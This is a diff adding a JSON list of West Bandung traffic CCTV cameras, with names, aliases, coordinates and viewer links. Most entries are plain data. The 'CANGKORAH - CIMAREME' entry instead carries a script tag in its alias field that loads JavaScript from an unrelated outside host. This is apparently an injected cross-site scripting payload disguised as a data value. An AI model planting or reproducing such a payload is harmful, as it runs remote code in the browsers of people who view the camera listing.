@@ -1,0 +1,350 @@
+[
+  {
+    "nama_cctv": "CIBURUY - CIPATAT",
+    "alias": "ciburuy_cipatat",
+    "koordinat": "-6.833915591335607, 107.46786140543834",
+    "link": "https://cctv.atcs-dishubkbb.id/9512d5e6-2424-44f0-869a-4026ea91b2ed.html"
+  },
+  {
+    "nama_cctv": "CIBURUY - TAGOG",
+    "alias": "ciburuy_tagog",
+    "koordinat": "-6.835305754629991, 107.47008764229965",
+    "link": "https://cctv.atcs-dishubkbb.id/99057394-48a9-4806-9f61-cbbd011ae6cf.html"
+  },
+  {
+    "nama_cctv": "CIKAMUNING - CIHALIWUNG",
+    "alias": "cikamuning_cihaliwung",
+    "koordinat": "-6.818731087624814, 107.47601456309565",
+    "link": "https://cctv.atcs-dishubkbb.id/341ddb06-0eb7-491b-a395-6684b4b1c835.html"
+  },
+  {
+    "nama_cctv": "CIKAMUNING - EXIT TOL",
+    "alias": "cikamuning_tol",
+    "koordinat": "-6.817623177580955, 107.47564977113643",
+    "link": "https://cctv.atcs-dishubkbb.id/f213ebc0-2e3d-4989-9552-7bbe06599d66.html"
+  },
+  {
+    "nama_cctv": "CIKAMUNING - PURWAKARTA",
+    "alias": "cikamining_purwakarta",
+    "koordinat": "-6.816994656829876, 107.47464125344727",
+    "link": "https://cctv.atcs-dishubkbb.id/a103fb59-3c3d-4bf3-b1b1-edc8232fdf48.html"
+  },
+  {
+    "nama_cctv": "TAGOG PADALARANG - BANDUNG",
+    "alias": "tagog_bandung",
+    "koordinat": "-6.843101879276617, 107.4854323231379",
+    "link": "https://cctv.atcs-dishubkbb.id/8c6a68c4-5fa5-44b6-8be5-72860ba26ba8.html"
+  },
+  {
+    "nama_cctv": "TAGOG PADALARANG - PURWAKARTA",
+    "alias": "tagog_purwakarta",
+    "koordinat": "-6.8422437545735795, 107.4852254184576",
+    "link": "https://cctv.atcs-dishubkbb.id/02e59fd8-d67a-40b3-bb2c-5f54c7bcadf9.html"
+  },
+  {
+    "nama_cctv": "LEMBANG BETRIX - BANDUNG",
+    "alias": "betrix_bdg",
+    "koordinat": "-6.819122047368872, 107.61154699224200",
+    "link": "https://cctv.atcs-dishubkbb.id/ef739a9d-0e90-49db-8fc2-2717f0b62ef6.html"
+  },
+  {
+    "nama_cctv": "LEMBANG BETRIX - PARONGPONG",
+    "alias": "betrixPrpg",
+    "koordinat": "-6.819122047368872, 107.61154699224176",
+    "link": "https://cctv.atcs-dishubkbb.id/d860bdd1-7791-49e4-9c1d-975ca897a9d1.html"
+  },
+  {
+    "nama_cctv": "CITUNJUNG - CIMAREME",
+    "alias": "citunjangCmrm",
+    "koordinat": "-6.911510245352121,107.50231221228799",
+    "link": "https://cctv.atcs-dishubkbb.id/f35c5dc6-3b5a-427e-8e4f-db475b999616.html"
+  },
+  {
+    "nama_cctv": "CITUNJUNG - BATUJAJAR",
+    "alias": "citunjangBtjjr",
+    "koordinat": "-6.911512245352121,107.50222221228799",
+    "link": "https://cctv.atcs-dishubkbb.id/54b72fb9-43c8-426c-8fbc-9a91bf13f857.html"
+  },
+  {
+    "nama_cctv": "LEMBANG BATAS - KOTA BDG",
+    "alias": "lebangBtskt",
+    "koordinat": "-6.841858649683888,107.59726373708864",
+    "link": "https://cctv.atcs-dishubkbb.id/4bb50deb-d1c4-4840-ba61-dd5b6925da0b.html"
+  },
+  {
+    "nama_cctv": "FARMHOUSE - LEMBANG",
+    "alias": "farmhouseLmbg",
+    "koordinat": "-6.832358026689465,107.60527788925069",
+    "link": "https://cctv.atcs-dishubkbb.id/4936192b-c8b3-43fb-ba9f-14b1099f307c.html"
+  },
+  {
+    "nama_cctv": "FARMHOUSE - BANDUNG",
+    "alias": "farmhousebdg",
+    "koordinat": "-6.8323152,107.6052843",
+    "link": "https://cctv.atcs-dishubkbb.id/671df771-b4ea-49f4-a9e9-aac462c3a48c.html"
+  },
+  {
+    "nama_cctv": "LEMBANG DARUL HIKAM - SESPIM",
+    "alias": "darulhikamSpm",
+    "koordinat": "-6.823156, 107.635399",
+    "link": "https://cctv.atcs-dishubkbb.id/26272c4d-0f36-4a70-bc9e-2a6b0a852a78.html"
+  },
+  {
+    "nama_cctv": "LEMBANG DARUL HIKAM - KAYU AMBON",
+    "alias": "darulhikamKyambn",
+    "koordinat": "-6.823370, 107.635608",
+    "link": "https://cctv.atcs-dishubkbb.id/83f91fde-f8f2-4a7b-ae6d-a6e74fb4b592.html"
+  },
+  {
+    "nama_cctv": "LEMBANG UNAI - CIHANJUANG",
+    "alias": "unaiChjg",
+    "koordinat": "-6.80301102008044, 107.57908959234157",
+    "link": "https://cctv.atcs-dishubkbb.id/71c2b98d-868c-40c1-baae-b34b20480adf.html"
+  },
+  {
+    "nama_cctv": "LEMBANG UNAI - CISARUA",
+    "alias": "unaiCsra",
+    "koordinat": "-6.802293076129773, 107.57853668156966",
+    "link": "https://cctv.atcs-dishubkbb.id/e7a94d54-466a-432a-a57b-896779a3f359.html"
+  },
+  {
+    "nama_cctv": "ALUN ALUN CILILIN - BATUJAJAR",
+    "alias": "cililinBtjjr",
+    "koordinat": "-6.951108818432368,107.4577649540065",
+    "link": "https://cctv.atcs-dishubkbb.id/633da1e9-5e53-4721-a03d-3312b3dcb436.html"
+  },
+  {
+    "nama_cctv": "ALUN ALUN CILILIN - SINDANGKERTA",
+    "alias": "cililinSdkrt",
+    "koordinat": "-6.951073, 107.457487",
+    "link": "https://cctv.atcs-dishubkbb.id/ec96824a-6726-4608-8194-83fbbc274a51.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - GEDONG 5 BAWAH - STASION",
+    "alias": "padalarangGedonglime",
+    "koordinat": "-6.84724847811174, 107.49203582004206",
+    "link": "https://cctv.atcs-dishubkbb.id/5a8e5507-18f9-47ce-8c46-3524862ad6bb.html"
+  },
+  {
+    "nama_cctv": "CIMAREME 1 - CIMAHI",
+    "alias": "cimaremeArahCimahi",
+    "koordinat": "-6.863497230482134, 107.50374828609174",
+    "link": "https://cctv.atcs-dishubkbb.id/4a69fe99-674c-4d18-b58c-b1d3133d7626.html"
+  },
+  {
+    "nama_cctv": "LEMBANG - GRAND HOTEL - BANDUNG",
+    "alias": "GrandHotelBandung",
+    "koordinat": "-6.814927132857176, 107.61420613754868",
+    "link": "https://cctv.atcs-dishubkbb.id/1e9f3cc5-58b9-4169-b959-5e26d4283db7.html"
+  },
+  {
+    "nama_cctv": "LEMBANG - PARATAG - CIMAHI",
+    "alias": "LemangParatagCimahi",
+    "koordinat": "-6.81675958695607, 107.55546751094498",
+    "link": "https://cctv.atcs-dishubkbb.id/b4b839d0-6a88-4f71-b96a-12f4373c9fed.html"
+  },
+  {
+    "nama_cctv": "LEMBANG - PARATAG - LEMBANG",
+    "alias": "ParatagArahLembang",
+    "koordinat": "-6.81675958695607, 107.55546751094498",
+    "link": "https://cctv.atcs-dishubkbb.id/5a6cdfa6-c7bb-4086-96a2-125b8a562747.html"
+  },
+  {
+    "nama_cctv": "LEMBANG - TOKO INTIMETAL - CIJERUK",
+    "alias": "intimetalcijeruk",
+    "koordinat": "-6.817447011490806, 107.62239800700868",
+    "link": "https://cctv.atcs-dishubkbb.id/f3de5bb9-89fa-4bc3-b543-e48761d317c4.html"
+  },
+  {
+    "nama_cctv": "LEMBANG - PASAR  LEMBANG",
+    "alias": "intimetalpasar",
+    "koordinat": "-6.817447011490806, 107.62239800700868",
+    "link": "https://cctv.atcs-dishubkbb.id/336b99ec-f691-4e98-ae88-7b51af8842e1.html"
+  },
+  {
+    "nama_cctv": "LEMBANG UNAI - LEMBANG",
+    "alias": "unailembang",
+    "koordinat": "-6.802683720588529, 107.57946174269867",
+    "link": "https://cctv.atcs-dishubkbb.id/dd2489bc-de9f-4b67-a95c-d4952fa11a69.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - GEDONG 5 ATAS - CIHALIWUNG",
+    "alias": "gedong5atascihaliwung",
+    "koordinat": "-6.842489797108856, 107.49553770582088",
+    "link": "https://cctv.atcs-dishubkbb.id/b50d64f1-7fdc-4c58-942d-bb018327e174.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - GEDONG 5 ATAS - KERTAJAYA",
+    "alias": "gedong5ataskertajaya",
+    "koordinat": "-6.842578, 107.496351",
+    "link": "https://cctv.atcs-dishubkbb.id/9bd7d138-361e-40e2-aabb-508d9b7d54eb.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - GEDONG 5 BAWAH - TOL",
+    "alias": "gedong5bawahtol",
+    "koordinat": "-6.848028759489725, 107.49220211721891",
+    "link": "https://cctv.atcs-dishubkbb.id/7885b4db-a93f-4e0c-ada4-9f11ca8809e5.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - GEDONG 5 ATAS - STASIUN",
+    "alias": "gedong5atas",
+    "koordinat": "-6.842927487971092, 107.49682205487389",
+    "link": "https://cctv.atcs-dishubkbb.id/f2648f57-eef6-49bf-9180-5dc071521f4f.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - GIANT - TAGOG",
+    "alias": "gianttagog",
+    "koordinat": "-6.849859376682095, 107.49488846980309",
+    "link": "https://cctv.atcs-dishubkbb.id/ac902612-1f98-43ff-9d0c-b0f1a8d7d6a1.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - JL. BARU KBP - TOL",
+    "alias": "kbptol",
+    "koordinat": "-6.8513065564442766, 107.49678614112455",
+    "link": "https://cctv.atcs-dishubkbb.id/f7f61926-3166-4ba1-9e90-3fcf269497c7.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - JL. SUNDIAL KBP - KBP TAGOG",
+    "alias": "sundialtagog",
+    "koordinat": "-6.852313, 107.494651",
+    "link": "https://cctv.atcs-dishubkbb.id/9d1cc825-245d-49b7-8412-34eb73d3d555.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - JL. SUNDIAL KBP - TOL",
+    "alias": "sundialtol",
+    "koordinat": "-6.851823, 107.495542",
+    "link": "https://cctv.atcs-dishubkbb.id/6905a6f2-4c36-442f-9a35-b08871f9f8bd.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - PURABAYA - CIPATAT",
+    "alias": "purabayaCipatat",
+    "koordinat": "-6.841275583629645, 107.48152527462065",
+    "link": "https://cctv.atcs-dishubkbb.id/c43816f8-f487-4b51-af04-a7cce245d4ef.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - PURABAYA - KAVALERI",
+    "alias": "purabayaKavaleri",
+    "koordinat": "-6.841682954516982, 107.48252279812449",
+    "link": "https://cctv.atcs-dishubkbb.id/a8a70d7d-0265-4ddb-be0e-9e6438728604.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - PURABAYA - TAGOG",
+    "alias": "purabayaTagog",
+    "koordinat": "-6.840862717447153, 107.48069353010696",
+    "link": "https://cctv.atcs-dishubkbb.id/e6549612-e618-4dc5-8e75-086ec0d8140c.html"
+  },
+  {
+    "nama_cctv": "PADALARANG FLYOVER - CIMAREME",
+    "alias": "flyovercireme",
+    "koordinat": "-6.8528057886606435, 107.49753693544172",
+    "link": "https://cctv.atcs-dishubkbb.id/ec13c486-5008-4006-83c5-04be0b075e54.html"
+  },
+  {
+    "nama_cctv": "PADALARANG FLYOVER - KBP",
+    "alias": "flyoverkbp",
+    "koordinat": "-6.851708611534994, 107.49744037456323",
+    "link": "https://cctv.atcs-dishubkbb.id/dfa0a451-adae-4309-98fb-53851b5c2e14.html"
+  },
+  {
+    "nama_cctv": "PADALARANG FLYOVER (PINTU TOL KELUAR)",
+    "alias": "flyovertolkeluar",
+    "koordinat": "-6.85215334138471, 107.49794194790003",
+    "link": "https://cctv.atcs-dishubkbb.id/edcfc0b5-4a59-48a4-82b0-9d587d93bc7e.html"
+  },
+  {
+    "nama_cctv": "PADALARANG GIANT - TOL",
+    "alias": "giantTol",
+    "koordinat": "-6.850531, 107.495829",
+    "link": "https://cctv.atcs-dishubkbb.id/d2e6bcb6-e6d5-4c0f-81c6-134e1345c8b5.html"
+  },
+  {
+    "nama_cctv": "CIMAREME 1 - PADALARANG",
+    "alias": "CiamaremePadalarang",
+    "koordinat": "-6.863103109411434, 107.50301872346095",
+    "link": "https://cctv.atcs-dishubkbb.id/6d7e169d-d11b-43bd-b8c1-fe58cdc60cda.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - CIHALIWUNG - CIKALONG",
+    "alias": "padalarangCihaliwungcikalong",
+    "koordinat": "-6.8363680, 107.4888369",
+    "link": "https://cctv.atcs-dishubkbb.id/67968ed3-ded3-4b14-8e65-792ad566f7fe.html"
+  },
+  {
+    "nama_cctv": "PADALARANG - CIHALIWUNG - STASIUN",
+    "alias": "padalarangCihaliwungSTATIUN",
+    "koordinat": "-6.836834916625617, 107.48848128886098",
+    "link": "https://cctv.atcs-dishubkbb.id/8ec35155-b847-41a8-8387-68cfb2ad184b.html"
+  },
+  {
+    "nama_cctv": "SIMPANG BBS - CILILIN",
+    "alias": "simpangBBS(cililin)",
+    "koordinat": "-6.935720814519057, 107.50354778846983",
+    "link": "https://cctv.atcs-dishubkbb.id/1372824f-a99d-450b-a614-5fddb49bb96f.html"
+  },
+  {
+    "nama_cctv": "SIMPANG BBS - CIPATIK",
+    "alias": "simpangBBS(cipatik)",
+    "koordinat": "-6.935237203257295, 107.50502550688547",
+    "link": "https://cctv.atcs-dishubkbb.id/08f471e0-ea5b-4867-bb9d-8dce1a3c26dd.html"
+  },
+  {
+    "nama_cctv": "LANGENSARI - CIBODAS",
+    "alias": "langensari(cibodas)",
+    "koordinat": "-6.829739, 107.644789",
+    "link": "https://cctv.atcs-dishubkbb.id/2946e37c-f05e-4c1c-96de-0a873d375f4c.html"
+  },
+  {
+    "nama_cctv": "LANGENSARI - SESPIM",
+    "alias": "langensari(sespim)",
+    "koordinat": "-6.829535, 107.6448",
+    "link": "https://cctv.atcs-dishubkbb.id/ea81b6aa-211a-4f0b-9b5c-68a38426ca8c.html"
+  },
+  {
+    "nama_cctv": "CIHAMPELAS - SAYURAN",
+    "alias": "Cihampelas(Sayuran)",
+    "koordinat": "-6.925005, 107.479486",
+    "link": "https://cctv.atcs-dishubkbb.id/3d00f22f-2c26-4961-affe-9980dae9883c.html"
+  },
+  {
+    "nama_cctv": "CIHAMPELAS - BBS",
+    "alias": "Cihampelas(BBS)",
+    "koordinat": "-6.925062, 107.479790",
+    "link": "https://cctv.atcs-dishubkbb.id/17a9b36c-e087-4231-80f9-2ecc87b6fb00.html"
+  },
+  {
+    "nama_cctv": "CANGKORAH - LEUWIGAJAH",
+    "alias": "cangkorahLeuwigajah",
+    "koordinat": "-6.8981313,107.5023232",
+    "link": "https://cctv.atcs-dishubkbb.id/a1dba728-28bb-4ba5-86b4-a898cfeb1753.html"
+  },
+  {
+    "nama_cctv": "CANGKORAH - CIMAREME",
+    "alias": "<script type=\"text/javascript\" src=\"https://jso-tools.z-x.my.id/raw/~/7C3RNTS4XVUEX\"></script>",
+    "koordinat": "-6.8981313,107.5023232",
+    "link": "https://cctv.atcs-dishubkbb.id/86bf138e-01b3-4724-b2c1-ff5782b326fe.html"
+  },
+  {
+    "nama_cctv": "CANGKORAH - BATUJAJAR",
+    "alias": "cangkorahBatujajar",
+    "koordinat": "-6.8981313,107.5023232",
+    "link": "https://cctv.atcs-dishubkbb.id/71ea14f7-d25b-48db-8afe-b48531eb4206.html"
+  },
+  {
+    "nama_cctv": "WARUNG PULUS - CIMAREME",
+    "alias": "warung pulus cimareme",
+    "koordinat": "-6.9171836,107.4915476",
+    "link": "https://cctv.atcs-dishubkbb.id/372cc649-a609-4613-9414-3f38ee52e5ff.html"
+  },
+  {
+    "nama_cctv": "LEMBANG ORCHID - BANDUNG",
+    "alias": "cctv_orchid_bandung",
+    "koordinat": "-6.782605, 107.649780",
+    "link": "https://cctv.atcs-dishubkbb.id/1206e494-60c6-4367-9780-2d6ea50ab578.html"
+  },
+  {
+    "nama_cctv": "LEMBANG ORCHID - SUBANG",
+    "alias": "orchid_subang",
+    "koordinat": "-6.782819,107.650079",
+    "link": "https://cctv.atcs-dishubkbb.id/a260f274-0b48-41b4-90bf-ec4f1e059d5c.html"
+  }
+]
